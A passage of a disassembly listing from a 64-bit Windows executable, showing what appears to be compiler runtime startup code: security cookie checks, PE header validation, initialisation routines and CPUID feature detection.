   1400087c6:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400087ca:	74 06                	je     0x1400087d2
   1400087cc:	e8 df 08 00 00       	call   0x1400090b0
   1400087d1:	cc                   	int3
   1400087d2:	e8 89 94 ff ff       	call   0x140001c60
   1400087d7:	cc                   	int3
   1400087d8:	e9 f3 08 00 00       	jmp    0x1400090d0
   1400087dd:	cc                   	int3
   1400087de:	cc                   	int3
   1400087df:	cc                   	int3
   1400087e0:	48 8b c4             	mov    %rsp,%rax
   1400087e3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400087e7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400087eb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400087ef:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400087f3:	41 56                	push   %r14
   1400087f5:	48 83 ec 20          	sub    $0x20,%rsp
   1400087f9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   1400087fd:	48 8b f2             	mov    %rdx,%rsi
   140008800:	4d 8b f0             	mov    %r8,%r14
   140008803:	48 8b e9             	mov    %rcx,%rbp
   140008806:	49 8b d1             	mov    %r9,%rdx
   140008809:	48 8b ce             	mov    %rsi,%rcx
   14000880c:	49 8b f9             	mov    %r9,%rdi
   14000880f:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140008813:	e8 04 03 00 00       	call   0x140008b1c
   140008818:	8b 45 04             	mov    0x4(%rbp),%eax
   14000881b:	24 66                	and    $0x66,%al
   14000881d:	f6 d8                	neg    %al
   14000881f:	b8 01 00 00 00       	mov    $0x1,%eax
   140008824:	45 1b c9             	sbb    %r9d,%r9d
   140008827:	41 f7 d9             	neg    %r9d
   14000882a:	44 03 c8             	add    %eax,%r9d
   14000882d:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140008831:	74 11                	je     0x140008844
   140008833:	4c 8b cf             	mov    %rdi,%r9
   140008836:	4d 8b c6             	mov    %r14,%r8
   140008839:	48 8b d6             	mov    %rsi,%rdx
   14000883c:	48 8b cd             	mov    %rbp,%rcx
   14000883f:	e8 f4 0d 00 00       	call   0x140009638
   140008844:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008849:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000884e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008853:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140008858:	48 83 c4 20          	add    $0x20,%rsp
   14000885c:	41 5e                	pop    %r14
   14000885e:	c3                   	ret
   14000885f:	cc                   	int3
   140008860:	cc                   	int3
   140008861:	cc                   	int3
   140008862:	cc                   	int3
   140008863:	cc                   	int3
   140008864:	cc                   	int3
   140008865:	cc                   	int3
   140008866:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000886d:	00 00 00 
   140008870:	48 3b 0d 49 a3 00 00 	cmp    0xa349(%rip),%rcx        # 0x140012bc0
   140008877:	75 10                	jne    0x140008889
   140008879:	48 c1 c1 10          	rol    $0x10,%rcx
   14000887d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140008882:	75 01                	jne    0x140008885
   140008884:	c3                   	ret
   140008885:	48 c1 c9 10          	ror    $0x10,%rcx
   140008889:	e9 7e 08 00 00       	jmp    0x14000910c
   14000888e:	cc                   	int3
   14000888f:	cc                   	int3
   140008890:	40 53                	rex push %rbx
   140008892:	48 83 ec 20          	sub    $0x20,%rsp
   140008896:	48 8d 05 3b 55 00 00 	lea    0x553b(%rip),%rax        # 0x14000ddd8
   14000889d:	48 8b d9             	mov    %rcx,%rbx
   1400088a0:	48 89 01             	mov    %rax,(%rcx)
   1400088a3:	f6 c2 01             	test   $0x1,%dl
   1400088a6:	74 0a                	je     0x1400088b2
   1400088a8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400088ad:	e8 26 ff ff ff       	call   0x1400087d8
   1400088b2:	48 8b c3             	mov    %rbx,%rax
   1400088b5:	48 83 c4 20          	add    $0x20,%rsp
   1400088b9:	5b                   	pop    %rbx
   1400088ba:	c3                   	ret
   1400088bb:	cc                   	int3
   1400088bc:	48 83 ec 28          	sub    $0x28,%rsp
   1400088c0:	e8 97 09 00 00       	call   0x14000925c
   1400088c5:	85 c0                	test   %eax,%eax
   1400088c7:	74 21                	je     0x1400088ea
   1400088c9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400088d0:	00 00 
   1400088d2:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400088d6:	eb 05                	jmp    0x1400088dd
   1400088d8:	48 3b c8             	cmp    %rax,%rcx
   1400088db:	74 14                	je     0x1400088f1
   1400088dd:	33 c0                	xor    %eax,%eax
   1400088df:	f0 48 0f b1 0d 28 a7 	lock cmpxchg %rcx,0xa728(%rip)        # 0x140013010
   1400088e6:	00 00 
   1400088e8:	75 ee                	jne    0x1400088d8
   1400088ea:	32 c0                	xor    %al,%al
   1400088ec:	48 83 c4 28          	add    $0x28,%rsp
   1400088f0:	c3                   	ret
   1400088f1:	b0 01                	mov    $0x1,%al
   1400088f3:	eb f7                	jmp    0x1400088ec
   1400088f5:	cc                   	int3
   1400088f6:	cc                   	int3
   1400088f7:	cc                   	int3
   1400088f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400088fc:	85 c9                	test   %ecx,%ecx
   1400088fe:	75 07                	jne    0x140008907
   140008900:	c6 05 11 a7 00 00 01 	movb   $0x1,0xa711(%rip)        # 0x140013018
   140008907:	e8 e4 04 00 00       	call   0x140008df0
   14000890c:	e8 4b 0c 00 00       	call   0x14000955c
   140008911:	84 c0                	test   %al,%al
   140008913:	75 04                	jne    0x140008919
   140008915:	32 c0                	xor    %al,%al
   140008917:	eb 14                	jmp    0x14000892d
   140008919:	e8 3e 0c 00 00       	call   0x14000955c
   14000891e:	84 c0                	test   %al,%al
   140008920:	75 09                	jne    0x14000892b
   140008922:	33 c9                	xor    %ecx,%ecx
   140008924:	e8 33 0c 00 00       	call   0x14000955c
   140008929:	eb ea                	jmp    0x140008915
   14000892b:	b0 01                	mov    $0x1,%al
   14000892d:	48 83 c4 28          	add    $0x28,%rsp
   140008931:	c3                   	ret
   140008932:	cc                   	int3
   140008933:	cc                   	int3
   140008934:	40 53                	rex push %rbx
   140008936:	48 83 ec 20          	sub    $0x20,%rsp
   14000893a:	80 3d d8 a6 00 00 00 	cmpb   $0x0,0xa6d8(%rip)        # 0x140013019
   140008941:	8b d9                	mov    %ecx,%ebx
   140008943:	75 67                	jne    0x1400089ac
   140008945:	83 f9 01             	cmp    $0x1,%ecx
   140008948:	77 6a                	ja     0x1400089b4
   14000894a:	e8 0d 09 00 00       	call   0x14000925c
   14000894f:	85 c0                	test   %eax,%eax
   140008951:	74 28                	je     0x14000897b
   140008953:	85 db                	test   %ebx,%ebx
   140008955:	75 24                	jne    0x14000897b
   140008957:	48 8d 0d c2 a6 00 00 	lea    0xa6c2(%rip),%rcx        # 0x140013020
   14000895e:	e8 2f 0d 00 00       	call   0x140009692
   140008963:	85 c0                	test   %eax,%eax
   140008965:	75 10                	jne    0x140008977
   140008967:	48 8d 0d ca a6 00 00 	lea    0xa6ca(%rip),%rcx        # 0x140013038
   14000896e:	e8 1f 0d 00 00       	call   0x140009692
   140008973:	85 c0                	test   %eax,%eax
   140008975:	74 2e                	je     0x1400089a5
   140008977:	32 c0                	xor    %al,%al
   140008979:	eb 33                	jmp    0x1400089ae
   14000897b:	66 0f 6f 05 3d 54 00 	movdqa 0x543d(%rip),%xmm0        # 0x14000ddc0
   140008982:	00 
   140008983:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008987:	f3 0f 7f 05 91 a6 00 	movdqu %xmm0,0xa691(%rip)        # 0x140013020
   14000898e:	00 
   14000898f:	48 89 05 9a a6 00 00 	mov    %rax,0xa69a(%rip)        # 0x140013030
   140008996:	f3 0f 7f 05 9a a6 00 	movdqu %xmm0,0xa69a(%rip)        # 0x140013038
   14000899d:	00 
   14000899e:	48 89 05 a3 a6 00 00 	mov    %rax,0xa6a3(%rip)        # 0x140013048
   1400089a5:	c6 05 6d a6 00 00 01 	movb   $0x1,0xa66d(%rip)        # 0x140013019
   1400089ac:	b0 01                	mov    $0x1,%al
   1400089ae:	48 83 c4 20          	add    $0x20,%rsp
   1400089b2:	5b                   	pop    %rbx
   1400089b3:	c3                   	ret
   1400089b4:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400089b9:	e8 b6 08 00 00       	call   0x140009274
   1400089be:	cc                   	int3
   1400089bf:	cc                   	int3
   1400089c0:	48 83 ec 18          	sub    $0x18,%rsp
   1400089c4:	4c 8b c1             	mov    %rcx,%r8
   1400089c7:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400089cc:	66 39 05 2d 76 ff ff 	cmp    %ax,-0x89d3(%rip)        # 0x140000000
   1400089d3:	75 78                	jne    0x140008a4d
   1400089d5:	48 63 0d 60 76 ff ff 	movslq -0x89a0(%rip),%rcx        # 0x14000003c
   1400089dc:	48 8d 15 1d 76 ff ff 	lea    -0x89e3(%rip),%rdx        # 0x140000000
   1400089e3:	48 03 ca             	add    %rdx,%rcx
   1400089e6:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400089ec:	75 5f                	jne    0x140008a4d
   1400089ee:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400089f3:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400089f7:	75 54                	jne    0x140008a4d
   1400089f9:	4c 2b c2             	sub    %rdx,%r8
   1400089fc:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140008a00:	48 83 c2 18          	add    $0x18,%rdx
   140008a04:	48 03 d1             	add    %rcx,%rdx
   140008a07:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008a0b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140008a0f:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140008a13:	48 89 14 24          	mov    %rdx,(%rsp)
   140008a17:	49 3b d1             	cmp    %r9,%rdx
   140008a1a:	74 18                	je     0x140008a34
   140008a1c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140008a1f:	4c 3b c1             	cmp    %rcx,%r8
   140008a22:	72 0a                	jb     0x140008a2e
   140008a24:	8b 42 08             	mov    0x8(%rdx),%eax
   140008a27:	03 c1                	add    %ecx,%eax
   140008a29:	4c 3b c0             	cmp    %rax,%r8
   140008a2c:	72 08                	jb     0x140008a36
   140008a2e:	48 83 c2 28          	add    $0x28,%rdx
   140008a32:	eb df                	jmp    0x140008a13
   140008a34:	33 d2                	xor    %edx,%edx
   140008a36:	48 85 d2             	test   %rdx,%rdx
   140008a39:	75 04                	jne    0x140008a3f
   140008a3b:	32 c0                	xor    %al,%al
   140008a3d:	eb 14                	jmp    0x140008a53
   140008a3f:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140008a43:	7d 04                	jge    0x140008a49
   140008a45:	32 c0                	xor    %al,%al
   140008a47:	eb 0a                	jmp    0x140008a53
   140008a49:	b0 01                	mov    $0x1,%al
   140008a4b:	eb 06                	jmp    0x140008a53
   140008a4d:	32 c0                	xor    %al,%al
   140008a4f:	eb 02                	jmp    0x140008a53
   140008a51:	32 c0                	xor    %al,%al
   140008a53:	48 83 c4 18          	add    $0x18,%rsp
   140008a57:	c3                   	ret
   140008a58:	40 53                	rex push %rbx
   140008a5a:	48 83 ec 20          	sub    $0x20,%rsp
   140008a5e:	8a d9                	mov    %cl,%bl
   140008a60:	e8 f7 07 00 00       	call   0x14000925c
   140008a65:	33 d2                	xor    %edx,%edx
   140008a67:	85 c0                	test   %eax,%eax
   140008a69:	74 0b                	je     0x140008a76
   140008a6b:	84 db                	test   %bl,%bl
   140008a6d:	75 07                	jne    0x140008a76
   140008a6f:	48 87 15 9a a5 00 00 	xchg   %rdx,0xa59a(%rip)        # 0x140013010
   140008a76:	48 83 c4 20          	add    $0x20,%rsp
   140008a7a:	5b                   	pop    %rbx
   140008a7b:	c3                   	ret
   140008a7c:	40 53                	rex push %rbx
   140008a7e:	48 83 ec 20          	sub    $0x20,%rsp
   140008a82:	80 3d 8f a5 00 00 00 	cmpb   $0x0,0xa58f(%rip)        # 0x140013018
   140008a89:	8a d9                	mov    %cl,%bl
   140008a8b:	74 04                	je     0x140008a91
   140008a8d:	84 d2                	test   %dl,%dl
   140008a8f:	75 0c                	jne    0x140008a9d
   140008a91:	e8 c6 0a 00 00       	call   0x14000955c
   140008a96:	8a cb                	mov    %bl,%cl
   140008a98:	e8 bf 0a 00 00       	call   0x14000955c
   140008a9d:	b0 01                	mov    $0x1,%al
   140008a9f:	48 83 c4 20          	add    $0x20,%rsp
   140008aa3:	5b                   	pop    %rbx
   140008aa4:	c3                   	ret
   140008aa5:	cc                   	int3
   140008aa6:	cc                   	int3
   140008aa7:	cc                   	int3
   140008aa8:	40 53                	rex push %rbx
   140008aaa:	48 83 ec 20          	sub    $0x20,%rsp
   140008aae:	48 83 3d 6a a5 00 00 	cmpq   $0xffffffffffffffff,0xa56a(%rip)        # 0x140013020
   140008ab5:	ff 
   140008ab6:	48 8b d9             	mov    %rcx,%rbx
   140008ab9:	75 07                	jne    0x140008ac2
   140008abb:	e8 de 0b 00 00       	call   0x14000969e
   140008ac0:	eb 0f                	jmp    0x140008ad1
   140008ac2:	48 8b d3             	mov    %rbx,%rdx
   140008ac5:	48 8d 0d 54 a5 00 00 	lea    0xa554(%rip),%rcx        # 0x140013020
   140008acc:	e8 c7 0b 00 00       	call   0x140009698
   140008ad1:	33 d2                	xor    %edx,%edx
   140008ad3:	85 c0                	test   %eax,%eax
   140008ad5:	48 0f 44 d3          	cmove  %rbx,%rdx
   140008ad9:	48 8b c2             	mov    %rdx,%rax
   140008adc:	48 83 c4 20          	add    $0x20,%rsp
   140008ae0:	5b                   	pop    %rbx
   140008ae1:	c3                   	ret
   140008ae2:	cc                   	int3
   140008ae3:	cc                   	int3
   140008ae4:	48 83 ec 28          	sub    $0x28,%rsp
   140008ae8:	e8 bb ff ff ff       	call   0x140008aa8
   140008aed:	48 f7 d8             	neg    %rax
   140008af0:	1b c0                	sbb    %eax,%eax
   140008af2:	f7 d8                	neg    %eax
   140008af4:	ff c8                	dec    %eax
   140008af6:	48 83 c4 28          	add    $0x28,%rsp
   140008afa:	c3                   	ret
   140008afb:	cc                   	int3
   140008afc:	48 83 ec 28          	sub    $0x28,%rsp
   140008b00:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140008b04:	48 8b ca             	mov    %rdx,%rcx
   140008b07:	49 8b d1             	mov    %r9,%rdx
   140008b0a:	e8 0d 00 00 00       	call   0x140008b1c
   140008b0f:	b8 01 00 00 00       	mov    $0x1,%eax
   140008b14:	48 83 c4 28          	add    $0x28,%rsp
   140008b18:	c3                   	ret
   140008b19:	cc                   	int3
   140008b1a:	cc                   	int3
   140008b1b:	cc                   	int3
   140008b1c:	40 53                	rex push %rbx
   140008b1e:	45 8b 18             	mov    (%r8),%r11d
   140008b21:	48 8b da             	mov    %rdx,%rbx
   140008b24:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140008b28:	4c 8b c9             	mov    %rcx,%r9
   140008b2b:	41 f6 00 04          	testb  $0x4,(%r8)
   140008b2f:	4c 8b d1             	mov    %rcx,%r10
   140008b32:	74 13                	je     0x140008b47
   140008b34:	41 8b 40 08          	mov    0x8(%r8),%eax
   140008b38:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140008b3c:	f7 d8                	neg    %eax
   140008b3e:	4c 03 d1             	add    %rcx,%r10
   140008b41:	48 63 c8             	movslq %eax,%rcx
   140008b44:	4c 23 d1             	and    %rcx,%r10
   140008b47:	49 63 c3             	movslq %r11d,%rax
   140008b4a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140008b4e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008b52:	8b 48 08             	mov    0x8(%rax),%ecx
   140008b55:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008b59:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140008b5e:	74 10                	je     0x140008b70
   140008b60:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140008b65:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140008b6a:	48 23 c1             	and    %rcx,%rax
   140008b6d:	4c 03 c8             	add    %rax,%r9
   140008b70:	4c 33 ca             	xor    %rdx,%r9
   140008b73:	49 8b c9             	mov    %r9,%rcx
   140008b76:	5b                   	pop    %rbx
   140008b77:	e9 f4 fc ff ff       	jmp    0x140008870
   140008b7c:	40 53                	rex push %rbx
   140008b7e:	48 83 ec 20          	sub    $0x20,%rsp
   140008b82:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008b87:	e8 24 0b 00 00       	call   0x1400096b0
   140008b8c:	e8 b3 09 00 00       	call   0x140009544
   140008b91:	8b c8                	mov    %eax,%ecx
   140008b93:	e8 42 0b 00 00       	call   0x1400096da
   140008b98:	e8 2b 08 00 00       	call   0x1400093c8
   140008b9d:	8b d8                	mov    %eax,%ebx
   140008b9f:	e8 60 0b 00 00       	call   0x140009704
   140008ba4:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008ba9:	89 18                	mov    %ebx,(%rax)
   140008bab:	e8 84 fd ff ff       	call   0x140008934
   140008bb0:	84 c0                	test   %al,%al
   140008bb2:	74 73                	je     0x140008c27
   140008bb4:	e8 e7 09 00 00       	call   0x1400095a0
   140008bb9:	48 8d 0d 1c 0a 00 00 	lea    0xa1c(%rip),%rcx        # 0x1400095dc
   140008bc0:	e8 1f ff ff ff       	call   0x140008ae4
   140008bc5:	e8 8a 06 00 00       	call   0x140009254
   140008bca:	8b c8                	mov    %eax,%ecx
   140008bcc:	e8 b5 0a 00 00       	call   0x140009686
   140008bd1:	85 c0                	test   %eax,%eax
   140008bd3:	75 52                	jne    0x140008c27
   140008bd5:	e8 72 09 00 00       	call   0x14000954c
   140008bda:	e8 a5 09 00 00       	call   0x140009584
   140008bdf:	85 c0                	test   %eax,%eax
   140008be1:	74 0c                	je     0x140008bef
   140008be3:	48 8d 0d de 07 00 00 	lea    0x7de(%rip),%rcx        # 0x1400093c8
   140008bea:	e8 c7 0a 00 00       	call   0x1400096b6
   140008bef:	e8 94 04 00 00       	call   0x140009088
   140008bf4:	e8 8f 04 00 00       	call   0x140009088
   140008bf9:	e8 ca 07 00 00       	call   0x1400093c8
   140008bfe:	8b c8                	mov    %eax,%ecx
   140008c00:	e8 f3 0a 00 00       	call   0x1400096f8
   140008c05:	e8 52 09 00 00       	call   0x14000955c
   140008c0a:	84 c0                	test   %al,%al
   140008c0c:	74 05                	je     0x140008c13
   140008c0e:	e8 79 0a 00 00       	call   0x14000968c
   140008c13:	e8 b0 07 00 00       	call   0x1400093c8
   140008c18:	e8 a3 07 00 00       	call   0x1400093c0
   140008c1d:	85 c0                	test   %eax,%eax
   140008c1f:	75 06                	jne    0x140008c27
   140008c21:	48 83 c4 20          	add    $0x20,%rsp
   140008c25:	5b                   	pop    %rbx
   140008c26:	c3                   	ret
   140008c27:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008c2c:	e8 43 06 00 00       	call   0x140009274
   140008c31:	cc                   	int3
   140008c32:	cc                   	int3
   140008c33:	cc                   	int3
   140008c34:	48 83 ec 28          	sub    $0x28,%rsp
   140008c38:	e8 2b 09 00 00       	call   0x140009568
   140008c3d:	33 c0                	xor    %eax,%eax
   140008c3f:	48 83 c4 28          	add    $0x28,%rsp
   140008c43:	c3                   	ret
   140008c44:	48 83 ec 28          	sub    $0x28,%rsp
   140008c48:	e8 d3 07 00 00       	call   0x140009420
   140008c4d:	e8 76 07 00 00       	call   0x1400093c8
   140008c52:	8b c8                	mov    %eax,%ecx
   140008c54:	48 83 c4 28          	add    $0x28,%rsp
   140008c58:	e9 a1 0a 00 00       	jmp    0x1400096fe
   140008c5d:	cc                   	int3
   140008c5e:	cc                   	int3
   140008c5f:	cc                   	int3
   140008c60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008c65:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008c6a:	57                   	push   %rdi
   140008c6b:	48 83 ec 30          	sub    $0x30,%rsp
   140008c6f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008c74:	e8 7f fc ff ff       	call   0x1400088f8
   140008c79:	84 c0                	test   %al,%al
   140008c7b:	0f 84 36 01 00 00    	je     0x140008db7
   140008c81:	40 32 f6             	xor    %sil,%sil
   140008c84:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140008c89:	e8 2e fc ff ff       	call   0x1400088bc
   140008c8e:	8a d8                	mov    %al,%bl
   140008c90:	8b 0d 72 a3 00 00    	mov    0xa372(%rip),%ecx        # 0x140013008
   140008c96:	83 f9 01             	cmp    $0x1,%ecx
   140008c99:	0f 84 23 01 00 00    	je     0x140008dc2
   140008c9f:	85 c9                	test   %ecx,%ecx
   140008ca1:	75 4a                	jne    0x140008ced
   140008ca3:	c7 05 5b a3 00 00 01 	movl   $0x1,0xa35b(%rip)        # 0x140013008
   140008caa:	00 00 00 
   140008cad:	48 8d 15 3c 19 00 00 	lea    0x193c(%rip),%rdx        # 0x14000a5f0
   140008cb4:	48 8d 0d 1d 19 00 00 	lea    0x191d(%rip),%rcx        # 0x14000a5d8
   140008cbb:	e8 08 0a 00 00       	call   0x1400096c8
   140008cc0:	85 c0                	test   %eax,%eax
   140008cc2:	74 0a                	je     0x140008cce
   140008cc4:	b8 ff 00 00 00       	mov    $0xff,%eax
   140008cc9:	e9 d9 00 00 00       	jmp    0x140008da7
   140008cce:	48 8d 15 fb 18 00 00 	lea    0x18fb(%rip),%rdx        # 0x14000a5d0
   140008cd5:	48 8d 0d bc 18 00 00 	lea    0x18bc(%rip),%rcx        # 0x14000a598
   140008cdc:	e8 e1 09 00 00       	call   0x1400096c2
   140008ce1:	c7 05 1d a3 00 00 02 	movl   $0x2,0xa31d(%rip)        # 0x140013008
   140008ce8:	00 00 00 
   140008ceb:	eb 08                	jmp    0x140008cf5
   140008ced:	40 b6 01             	mov    $0x1,%sil
   140008cf0:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140008cf5:	8a cb                	mov    %bl,%cl
   140008cf7:	e8 5c fd ff ff       	call   0x140008a58
   140008cfc:	e8 8f 08 00 00       	call   0x140009590
   140008d01:	48 8b d8             	mov    %rax,%rbx
   140008d04:	48 83 38 00          	cmpq   $0x0,(%rax)
   140008d08:	74 1e                	je     0x140008d28
   140008d0a:	48 8b c8             	mov    %rax,%rcx
   140008d0d:	e8 ae fc ff ff       	call   0x1400089c0
   140008d12:	84 c0                	test   %al,%al
   140008d14:	74 12                	je     0x140008d28
   140008d16:	45 33 c0             	xor    %r8d,%r8d
   140008d19:	41 8d 50 02          	lea    0x2(%r8),%edx
   140008d1d:	33 c9                	xor    %ecx,%ecx
   140008d1f:	48 8b 03             	mov    (%rbx),%rax
   140008d22:	ff 15 48 18 00 00    	call   *0x1848(%rip)        # 0x14000a570
   140008d28:	e8 6b 08 00 00       	call   0x140009598
   140008d2d:	48 8b d8             	mov    %rax,%rbx
   140008d30:	48 83 38 00          	cmpq   $0x0,(%rax)
   140008d34:	74 14                	je     0x140008d4a
   140008d36:	48 8b c8             	mov    %rax,%rcx
   140008d39:	e8 82 fc ff ff       	call   0x1400089c0
   140008d3e:	84 c0                	test   %al,%al
   140008d40:	74 08                	je     0x140008d4a
   140008d42:	48 8b 0b             	mov    (%rbx),%rcx
   140008d45:	e8 a8 09 00 00       	call   0x1400096f2
   140008d4a:	e8 6d 09 00 00       	call   0x1400096bc
   140008d4f:	48 8b f8             	mov    %rax,%rdi
   140008d52:	e8 8f 09 00 00       	call   0x1400096e6
   140008d57:	48 8b 18             	mov    (%rax),%rbx
   140008d5a:	e8 81 09 00 00       	call   0x1400096e0
   140008d5f:	4c 8b c7             	mov    %rdi,%r8
   140008d62:	48 8b d3             	mov    %rbx,%rdx
   140008d65:	8b 08                	mov    (%rax),%ecx
   140008d67:	e8 f4 93 ff ff       	call   0x140002160
   140008d6c:	8b d8                	mov    %eax,%ebx
   140008d6e:	e8 59 06 00 00       	call   0x1400093cc
   140008d73:	84 c0                	test   %al,%al
   140008d75:	74 55                	je     0x140008dcc
   140008d77:	40 84 f6             	test   %sil,%sil
   140008d7a:	75 05                	jne    0x140008d81
   140008d7c:	e8 23 09 00 00       	call   0x1400096a4
   140008d81:	33 d2                	xor    %edx,%edx
   140008d83:	b1 01                	mov    $0x1,%cl
   140008d85:	e8 f2 fc ff ff       	call   0x140008a7c
   140008d8a:	8b c3                	mov    %ebx,%eax
   140008d8c:	eb 19                	jmp    0x140008da7
   140008d8e:	8b d8                	mov    %eax,%ebx
   140008d90:	e8 37 06 00 00       	call   0x1400093cc
   140008d95:	84 c0                	test   %al,%al
   140008d97:	74 3b                	je     0x140008dd4
   140008d99:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140008d9e:	75 05                	jne    0x140008da5
   140008da0:	e8 47 09 00 00       	call   0x1400096ec
   140008da5:	8b c3                	mov    %ebx,%eax
   140008da7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008dac:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008db1:	48 83 c4 30          	add    $0x30,%rsp
   140008db5:	5f                   	pop    %rdi
   140008db6:	c3                   	ret
   140008db7:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008dbc:	e8 b3 04 00 00       	call   0x140009274
   140008dc1:	90                   	nop
   140008dc2:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008dc7:	e8 a8 04 00 00       	call   0x140009274
   140008dcc:	8b cb                	mov    %ebx,%ecx
   140008dce:	e8 fb 08 00 00       	call   0x1400096ce
   140008dd3:	90                   	nop
   140008dd4:	8b cb                	mov    %ebx,%ecx
   140008dd6:	e8 f9 08 00 00       	call   0x1400096d4
   140008ddb:	90                   	nop
   140008ddc:	48 83 ec 28          	sub    $0x28,%rsp
   140008de0:	e8 af 06 00 00       	call   0x140009494
   140008de5:	48 83 c4 28          	add    $0x28,%rsp
   140008de9:	e9 72 fe ff ff       	jmp    0x140008c60
   140008dee:	cc                   	int3
   140008def:	cc                   	int3
   140008df0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008df5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140008dfa:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008dff:	57                   	push   %rdi
   140008e00:	48 83 ec 10          	sub    $0x10,%rsp
   140008e04:	33 c0                	xor    %eax,%eax
   140008e06:	33 c9                	xor    %ecx,%ecx
   140008e08:	0f a2                	cpuid
   140008e0a:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140008e10:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140008e16:	0b d1                	or     %ecx,%edx
   140008e18:	8b e8                	mov    %eax,%ebp
   140008e1a:	b8 01 00 00 00       	mov    $0x1,%eax
   140008e1f:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140008e25:	0b d3                	or     %ebx,%edx
   140008e27:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140008e2a:	0f a2                	cpuid
   140008e2c:	8b f9                	mov    %ecx,%edi
   140008e2e:	75 5e                	jne    0x140008e8e
   140008e30:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140008e35:	48 c7 05 e0 9d 00 00 	movq   $0x8000,0x9de0(%rip)        # 0x140012c20
   140008e3c:	00 80 00 00 
   140008e40:	48 c7 05 dd 9d 00 00 	movq   $0xffffffffffffffff,0x9ddd(%rip)        # 0x140012c28
   140008e47:	ff ff ff ff 
   140008e4b:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140008e50:	74 28                	je     0x140008e7a
   140008e52:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140008e57:	74 21                	je     0x140008e7a
   140008e59:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140008e5e:	74 1a                	je     0x140008e7a
   140008e60:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140008e65:	83 f8 20             	cmp    $0x20,%eax
   140008e68:	77 24                	ja     0x140008e8e
   140008e6a:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140008e71:	00 00 00 
   140008e74:	48 0f a3 c1          	bt     %rax,%rcx
   140008e78:	73 14                	jae    0x140008e8e
   140008e7a:	44 8b 05 d3 a1 00 00 	mov    0xa1d3(%rip),%r8d        # 0x140013054
   140008e81:	41 83 c8 01          	or     $0x1,%r8d
   140008e85:	44 89 05 c8 a1 00 00 	mov    %r8d,0xa1c8(%rip)        # 0x140013054
   140008e8c:	eb 07                	jmp    0x140008e95
   140008e8e:	44 8b 05 bf a1 00 00 	mov    0xa1bf(%rip),%r8d        # 0x140013054
   140008e95:	45 33 c9             	xor    %r9d,%r9d
   140008e98:	41 8b f1             	mov    %r9d,%esi
   140008e9b:	45 8b d1             	mov    %r9d,%r10d
   140008e9e:	45 8b d9             	mov    %r9d,%r11d
   140008ea1:	83 fd 07             	cmp    $0x7,%ebp
   140008ea4:	7c 40                	jl     0x140008ee6
   140008ea6:	41 8d 41 07          	lea    0x7(%r9),%eax
   140008eaa:	33 c9                	xor    %ecx,%ecx
   140008eac:	0f a2                	cpuid
   140008eae:	8b f2                	mov    %edx,%esi
   140008eb0:	44 8b cb             	mov    %ebx,%r9d
   140008eb3:	0f ba e3 09          	bt     $0x9,%ebx
   140008eb7:	73 0b                	jae    0x140008ec4
   140008eb9:	41 83 c8 02          	or     $0x2,%r8d
